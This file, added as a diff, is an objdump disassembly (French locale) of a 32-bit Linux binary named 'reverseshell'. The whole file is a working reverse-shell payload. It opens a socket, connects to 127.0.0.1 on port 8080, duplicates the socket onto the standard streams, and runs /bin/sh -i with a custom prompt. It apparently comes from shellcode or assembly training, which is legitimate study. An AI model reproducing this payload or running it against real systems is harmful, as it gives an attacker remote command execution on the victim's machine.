@@ -1,0 +1,77 @@
+
+reverseshell:     format de fichier elf32-i386
+
+
+Déassemblage de la section .data :
+
+08049000 <arg0>:
+ 8049000:	2f                   	das    
+ 8049001:	62 69 6e             	bound  %ebp,0x6e(%ecx)
+ 8049004:	2f                   	das    
+ 8049005:	73 68                	jae    804906f <_start+0x34>
+	...
+
+08049008 <arg1>:
+ 8049008:	2d 69 00         	sub    $0x53500069,%eax
+
+0804900b <env0>:
+ 804900b:	50                   	push   %eax
+ 804900c:	53                   	push   %ebx
+ 804900d:	31 3d 5c 6e 5b 5c    	xor    %edi,0x5c5b6e5c
+ 8049013:	74 5d                	je     8049072 <loop+0x2>
+ 8049015:	20 5c 75 40          	and    %bl,0x40(%ebp,%esi,2)
+ 8049019:	5c                   	pop    %esp
+ 804901a:	68 20 5c 77 5c       	push   $0x5c775c20
+ 804901f:	6e                   	outsb  %ds:(%esi),(%dx)
+ 8049020:	5c                   	pop    %esp
+ 8049021:	5c                   	pop    %esp
+ 8049022:	24 20                	and    $0x20,%al
+ 8049024:	3a 20                	cmp    (%eax),%ah
+	...
+
+08049027 <argv>:
+ 8049027:	00 90 04 08 08 90    	add    %dl,-0x6ff7f7fc(%eax)
+ 804902d:	04 08                	add    $0x8,%al
+ 804902f:	00 00                	add    %al,(%eax)
+	...
+
+08049033 <envv>:
+ 8049033:	0b 90 04 08 00 00    	or     0x804(%eax),%edx
+	...
+
+0804903b <_start>:
+ 804903b:	66 b8 67 01          	mov    $0x167,%ax
+ 804903f:	b3 02                	mov    $0x2,%bl
+ 8049041:	b1 01                	mov    $0x1,%cl
+ 8049043:	b2 06                	mov    $0x6,%dl
+ 8049045:	cd 80                	int    $0x80
+ 8049047:	97                   	xchg   %eax,%edi
+ 8049048:	31 c9                	xor    %ecx,%ecx
+ 804904a:	f7 e1                	mul    %ecx
+ 804904c:	51                   	push   %ecx
+ 804904d:	51                   	push   %ecx
+ 804904e:	b9 80 ff ff fe       	mov    $0xfeffff80,%ecx
+ 8049053:	83 f1 ff             	xor    $0xffffffff,%ecx
+ 8049056:	51                   	push   %ecx
+ 8049057:	66 68 1f 90          	pushw  $0x901f
+ 804905b:	66 6a 02             	pushw  $0x2
+ 804905e:	89 e1                	mov    %esp,%ecx
+ 8049060:	6a 10                	push   $0x10
+ 8049062:	5a                   	pop    %edx
+ 8049063:	89 fb                	mov    %edi,%ebx
+ 8049065:	66 b8 6a 01          	mov    $0x16a,%ax
+ 8049069:	cd 80                	int    $0x80
+ 804906b:	87 df                	xchg   %ebx,%edi
+ 804906d:	6a 02                	push   $0x2
+ 804906f:	59                   	pop    %ecx
+
+08049070 <loop>:
+ 8049070:	b0 3f                	mov    $0x3f,%al
+ 8049072:	cd 80                	int    $0x80
+ 8049074:	49                   	dec    %ecx
+ 8049075:	79 f9                	jns    8049070 <loop>
+ 8049077:	bb 00 90 04 08       	mov    $0x8049000,%ebx
+ 804907c:	b9 27 90 04 08       	mov    $0x8049027,%ecx
+ 8049081:	ba 33 90 04 08       	mov    $0x8049033,%edx
+ 8049086:	b0 0b                	mov    $0xb,%al
+ 8049088:	cd 80                	int    $0x80
